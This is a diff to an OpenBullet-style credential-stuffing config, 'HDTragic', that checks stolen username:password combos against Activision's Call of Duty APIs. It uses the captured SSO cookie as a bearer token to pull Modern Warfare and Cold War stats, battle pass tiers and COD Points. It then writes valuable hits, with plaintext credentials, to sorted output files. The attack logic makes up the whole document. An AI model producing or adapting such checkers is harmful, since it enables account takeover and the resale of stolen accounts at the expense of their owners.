@@ -1,11 +1,11 @@
 [SETTINGS]
 {
   "Name": "HDTragic",
-  "SuggestedBots": 100,
+  "SuggestedBots": 200,
   "MaxCPM": 0,
-  "LastModified": "2020-12-31T01:32:29.3365098-07:00",
+  "LastModified": "2021-01-05T12:47:18.0551503-07:00",
   "AdditionalInfo": "",
-  "Author": "HDTragic",
+  "Author": "HDTragic#7650 on Discord",
   "Version": "1.4.1 [Anomaly]",
   "LoliSave": false,
   "IgnoreResponseErrors": false,
@@ -124,32 +124,36 @@ PARSE "<SOURCE>" JSON "ACT_SSO_COOKIE" -> VAR "4"
 
 #all PARSE "<SOURCE>" JSON "all" -> VAR "all" 
 
-#Level PARSE "<SOURCE>" JSON "level" CreateEmpty=FALSE -> CAP "Level" 
+#Level PARSE "<SOURCE>" JSON "level" CreateEmpty=FALSE -> CAP "MWLevel" 
 
-#KD PARSE "<SOURCE>" JSON "kdRatio" CreateEmpty=FALSE -> CAP "K/D" 
+#KD PARSE "<SOURCE>" JSON "kdRatio" CreateEmpty=FALSE -> CAP "MWK/D" 
 
-#Kills PARSE "<all>" JSON "kills" CreateEmpty=FALSE -> CAP "Kills" 
+#Kills PARSE "<all>" JSON "kills" CreateEmpty=FALSE -> CAP "MWKills" 
 
-#Prestige PARSE "<SOURCE>" JSON "prestige" CreateEmpty=FALSE -> CAP "Prestige" 
+#User PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "MWUser" 
 
-#User PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "User" 
+#BR PARSE "<SOURCE>" JSON "br" -> VAR "BR" 
 
-#WZ PARSE "<SOURCE>" JSON "br" -> VAR "WZ" 
+#Wins PARSE "<BR>" JSON "wins" -> CAP "WZ_Wins" 
 
-#wins PARSE "<WZ>" JSON "wins" CreateEmpty=FALSE -> CAP "WZ Wins" 
+#WZK/D PARSE "<BR>" JSON "kdRatio" -> CAP "WZ_K/D" 
 
-#kd PARSE "<WZ>" JSON "kdRatio" CreateEmpty=FALSE -> CAP "WZ K/D" 
+#Stats REQUEST GET "https://www.callofduty.com/api/papi-client/stats/cod/v1/title/cw/platform/<2>/gamer/<3>/profile/type/mp?locale=en" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "atvi-auth: Bearer <4>" 
 
-#Kills_Checker KEYCHECK BanOnToCheck=FALSE 
-  KEYCHAIN Custom "CUSTOM" AND 
-    KEY "<Kills>" LessThan "40000" 
-    KEY "<WZ Wins>" LessThan "100" 
-    KEY "<Prestige>" LessThan "4" 
-  KEYCHAIN Custom "CUSTOM" OR 
-    KEY "<WZ Wins>" DoesNotExist 
-    KEY "<WZ Wins>" EqualTo "" 
-    KEY "<Kills>" EqualTo "" 
-    KEY "<Kills>" DoesNotExist 
+#CWStats PARSE "<SOURCE>" JSON "all" CreateEmpty=FALSE -> VAR "CWStats" 
+
+#Prestige PARSE "<SOURCE>" JSON "prestige" CreateEmpty=FALSE -> CAP "CWPrestige" 
+
+#Level PARSE "<SOURCE>" JSON "level" CreateEmpty=FALSE -> CAP "CWLevel" 
+
+#KD PARSE "<SOURCE>" JSON "kdratio" CreateEmpty=FALSE -> CAP "CWK/D" 
+
+#Kills PARSE "<SOURCE>" JSON "kills" CreateEmpty=FALSE -> CAP "CWKills" 
 
 #BattlePass REQUEST GET "https://www.callofduty.com/api/papi-client/loot/title/cw/platform/<2>/gamer/<3>/status/en" 
   
@@ -157,96 +161,34 @@ PARSE "<SOURCE>" JSON "ACT_SSO_COOKIE" -> VAR "4"
   HEADER "atvi-auth: Bearer <4>" 
   HEADER "Accept: application/json, text/plain, */*" 
 
-#BP1 PARSE "<SOURCE>" JSON "loot_season_1" -> VAR "BP1" 
+#Season2 PARSE "<SOURCE>" JSON "loot_season_1" -> VAR "loot_season_1" 
 
-#BP1_Tier PARSE "<BP1>" JSON "tier" CreateEmpty=FALSE -> CAP "S1T" 
+#Current_Tier PARSE "<loot_season_1>" JSON "tier" -> CAP "Current_Tier" 
 
-#BP1_Premium PARSE "<BP1>" JSON "premium" CreateEmpty=FALSE -> CAP "S1P" 
+#Season1 PARSE "<SOURCE>" JSON "loot_season_0" -> VAR "loot_season_0" 
 
-#Camo REQUEST GET "https://www.callofduty.com/api/papi-client/loadouts/v3/title/mw/platform/<2>/gamer/<3>/mode/mp" 
+#Last_Season_Tier PARSE "<loot_season_0>" JSON "tier" -> CAP "Last_Season_Tier" 
+
+REQUEST GET "https://my.callofduty.com/api/papi-client/inventory/v1/title/cw/platform/<2>/gamer/<3>/currency" 
   
   HEADER "atvi-auth: Bearer <4>" 
   HEADER "Accept: application/json, text/plain, */*" 
 
-IF "<SOURCE>" Contains "org.springframework.web.client.HttpClientErrorException","message":"404 NOT FOUND"
+#COD_Points PARSE "<SOURCE>" JSON "codPoints" CreateEmpty=FALSE -> CAP "Points" 
 
-FUNCTION Constant "No" -> CAP "Camo" 
+IF "<WZ_Wins>" GreaterThan "150"
 
-ELSE
-
-FUNCTION Constant "Yes" -> CAP "Camo" 
+UTILITY File "WZ_Wins_100+.txt" AppendLines "----[Account]----\\nCombo : <USER>:<PASS>\\nUser : <MWUser>\\nCod Points : <Points>\\n---------[INFORMATION]-------\\nGames : <Games>\\nPlatform : <Platform>\\nEmail Validated : <EmailValidated>\\n-------[Modern Warfare]------\\nLevel : <MWLevel>\\nKills : <MWKills>\\nK/D : <MWK/D>\\nWZ Wins : <WZ_Wins>\\nWZ K/D : <WZ_K/D>\\n---------[Cold War]--------\\nPrestige : <CWPrestige>\\nLevel : <CWLevel>\\nKills : <CWKills>\\nK/D : <CWK/D>\\nSeason 1 Tier : <Last_Season_Tier>\\nSeason 2 Tier : <Current_Tier>\\n********Config By: HD Tragic#7650**********" 
 
 ENDIF
+IF "<MWKills>" GreaterThan "50000"
 
-PARSE "<SOURCE>" LR "playerCamosOwnedByWeapon\":{\"" "}}}}" -> VAR "CAMO" 
-
-IF "<CAMO>" Contains "camo_11a"
-
-FUNCTION Constant "True" -> CAP "Gold" 
-
-ELSE
-
-FUNCTION Constant "False" -> CAP "Gold" 
+UTILITY File "MW_Kills_40K+.txt" AppendLines "----[Account]----\\nCombo : <USER>:<PASS>\\nUser : <MWUser>\\nCod Points : <Points>\\n---------[INFORMATION]-------\\nGames : <Games>\\nPlatform : <Platform>\\nEmail Validated : <EmailValidated>\\n-------[Modern Warfare]------\\nLevel : <MWLevel>\\nKills : <MWKills>\\nK/D : <MWK/D>\\nWZ Wins : <WZ_Wins>\\nWZ K/D : <WZ_K/D>\\n---------[Cold War]--------\\nPrestige : <CWPrestige>\\nLevel : <CWLevel>\\nKills : <CWKills>\\nK/D : <CWK/D>\\nSeason 1 Tier : <Last_Season_Tier>\\nSeason 2 Tier : <Current_Tier>\\n********Config By: HD Tragic#7650**********" 
 
 ENDIF
-IF "<CAMO>" Contains "camo_11b"
+IF "<CWPrestige>" GreaterThan "7"
 
-FUNCTION Constant "True" -> CAP "Platinum" 
-
-ELSE
-
-FUNCTION Constant "False" -> CAP "Platinum" 
-
-ENDIF
-IF "<CAMO>" Contains "camo_11c"
-
-FUNCTION Constant "True" -> CAP "Damascus" 
-
-FUNCTION CountOccurrences "camo_11c" "<CAMO>" -> VAR "HMD" 
-
-ELSE
-
-FUNCTION Constant "False" -> CAP "Damascus" 
-
-ELSE
-IF "<HMD>" GreaterThan "10"
-
-FUNCTION Constant "True" -> CAP "Damascus" 
-
-ELSE
-
-FUNCTION Constant "False" -> CAP "Damascus" 
-
-ENDIF
-IF "<CAMO>" Contains "camo_11d"
-
-FUNCTION Constant "True" -> CAP "Obsidian" 
-
-FUNCTION CountOccurrences "camo_11d" "<CAMO>" -> CAP "Obsidian Count" 
-
-ELSE
-
-FUNCTION Constant "False" -> CAP "Obsidian" 
-
-ENDIF
-IF "<Damascus>" Contains "True"
-
-UTILITY File "Hits_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
-
-ENDIF
-IF "<Kills>" GreaterThan "38000"
-
-UTILITY File "38K+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
-
-ENDIF
-IF "<WZ Wins>" GreaterThan "100"
-
-UTILITY File "WZWins100+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
-
-ENDIF
-IF "<Prestige>" GreaterThen "3"
-
-UTILITY File "Prestige4+_HDTragic.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nWZ Wins: <WZ Wins>\\nWZ K/D : <WZ K/D>" 
+UTILITY File "CW_Prestige_5+.txt" AppendLines "----[Account]----\\nCombo : <USER>:<PASS>\\nUser : <MWUser>\\nCod Points : <Points>\\n---------[INFORMATION]-------\\nGames : <Games>\\nPlatform : <Platform>\\nEmail Validated : <EmailValidated>\\n-------[Modern Warfare]------\\nLevel : <MWLevel>\\nKills : <MWKills>\\nK/D : <MWK/D>\\nWZ Wins : <WZ_Wins>\\nWZ K/D : <WZ_K/D>\\n---------[Cold War]--------\\nPrestige : <CWPrestige>\\nLevel : <CWLevel>\\nKills : <CWKills>\\nK/D : <CWK/D>\\nSeason 1 Tier : <Last_Season_Tier>\\nSeason 2 Tier : <Current_Tier>\\n********Config By: HD Tragic#7650**********" 
 
 ENDIF
 
